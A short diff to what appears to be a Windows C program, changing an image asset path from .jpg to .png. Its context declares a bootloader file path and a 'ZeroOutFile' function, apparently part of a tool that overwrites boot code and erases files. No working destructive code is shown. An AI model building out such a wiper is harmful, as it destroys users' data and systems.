@@ -7,7 +7,7 @@
 #include <stddef.h>
 
 #define BUFFER_SIZE 4096
-#define IMAGE_PATH "assets/image.jpg"
+#define IMAGE_PATH "assets/image.png"
 #define BOOTLOADER_PATH "bootloader.bin"
 
 BOOL ZeroOutFile(LPCWSTR filename);
